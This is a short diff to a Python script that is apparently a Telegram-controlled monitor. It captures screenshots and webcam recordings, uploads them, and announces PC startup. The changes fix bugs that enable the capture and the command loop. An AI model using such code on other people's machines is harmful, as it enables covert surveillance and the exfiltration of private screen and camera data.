@@ -10,7 +10,7 @@ import json
 import threading
 import os
 from time import sleep
-# import pyautogui
+import pyautogui
 import pathlib
 import cv2
 # ============================================================================================
@@ -136,7 +136,7 @@ def screen_shot():
     path = pathlib.Path().absolute()
     image.save(str(path) + f'/screen{screen_seq}.png')
     t1 = threading.Thread(target=upload_to_telegram, args=(name,))
-    t.start()
+    t1.start()
 # ============================================================================================
 
 
@@ -215,9 +215,10 @@ def initializing():
 # ============================================================================================
 # ================================Alerting About PC Starts.===================================
 # ============================================================================================
-
+initializing()
 # ============================================================================================
-
+# ================================Alerting About PC Ends.=====================================
+# ============================================================================================
 
 
 
@@ -329,7 +330,8 @@ while True:
                 else:
                     command = web_record()
                 data = 'Working and Uploading...'
-            except data = 'Error Occured!'
+            except:
+                data = 'Error Occured!'
             continue
 
 
